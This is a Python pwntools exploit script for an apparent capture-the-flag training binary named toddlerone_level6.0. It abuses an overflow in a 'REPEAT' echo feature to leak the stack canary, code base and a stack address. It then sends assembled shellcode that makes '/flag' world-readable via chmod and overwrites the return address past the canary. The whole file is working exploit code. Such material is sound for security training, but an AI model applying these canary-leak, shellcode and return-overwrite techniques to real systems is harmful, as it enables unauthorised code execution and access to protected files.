from pwn import *
context.arch='amd64'

r = process('/challenge/toddlerone_level6.0')
#r = process(['sudo','strace','/challenge/toddlerone_level6.0'])
payload = asm(
'''

    push 0
    pop rax
    push 3
    pop rdi
    push rsp
    pop rsi
    push 100
    pop rdx
    syscall


    push 1
    pop rax
    push rsp
    pop rsi
    push 100
    pop rdx
    push 1
    pop rdi
    syscall

    '''
)






r.sendline(b'500')
r.send(b'REPEAT\x41\x41' + b'a'*0x5f + b'c'*2)
r.recvuntil(b'aaaaaaac')
canary = u64(r.recv(8))-ord('c')
print(hex(canary))

### leak code base
r.sendline(b'500')
r.send(b'REPEAT\x41\x41' + b'a'*0x7f + b'c')
r.recvuntil(b'aaaaaaac')
code = u64(r.recv(6) + b'\x00\x00') - 0x2068;
print(hex(code))



## leak stack
r.sendline(b'500')
r.send(b'REPEAT\x41\x41' +b'a'*0x77 + b'c')
r.recvuntil(b'aaaaaaac')
stack = u64(r.recv(6) + b'\x00\x00')
print(hex(stack))

###  rop 1
ret_address = stack - 0xa0*4
print(hex(ret_address))
r.sendline(b'1000')
payload2=asm(f'''
    push 90
    pop rax
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''')
r.send(payload2.ljust(0x58,b'\x00') + p32(1) + p32(90) + b'a'*0x8 + p64(canary) + b'a' * 0x8 + p64(stack-800))

r.interactive()
